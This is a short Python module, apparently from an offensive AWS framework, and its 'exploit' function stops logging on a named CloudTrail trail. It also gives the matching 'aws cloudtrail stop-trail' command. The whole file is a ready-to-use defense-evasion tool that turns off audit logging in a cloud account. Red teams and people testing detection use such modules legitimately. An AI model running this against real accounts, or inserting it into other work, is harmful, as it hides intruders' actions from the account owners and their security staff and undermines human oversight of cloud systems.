import sys

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
	"SERVICE": {
		"value": "cloudtrail",
		"required": "true",
        "description":"The service that will be used to run the module. It cannot be changed."
	},
	"TRAIL-NAME": {
		"value": "",
		"required": "true",
        "description":"Specifies the name or the CloudTrail ARN of the trail for which CloudTrail will stop logging Amazon Web Services API calls."
	}
}
description = "Stop a CloudTrail Trail on a specific Region."

aws_command = "aws cloudtrail stop-trail --name <name> --region <region> --profile <profile>"

def exploit(profile, callstoprofile):
	trailName = variables['TRAIL-NAME']['value']

	try:
		profile.stop_logging(
			Name=trailName
		)

		status = f"Successfully stopped CloudTrail Trail {trailName}"

	except Exception as e:
		status = f"CloudTrail Trail {trailName} was not stopped with error code: {str(e)}."

	return {
		"TrailName": {
			"TrailName": trailName,
			"Status": status
		}
	}

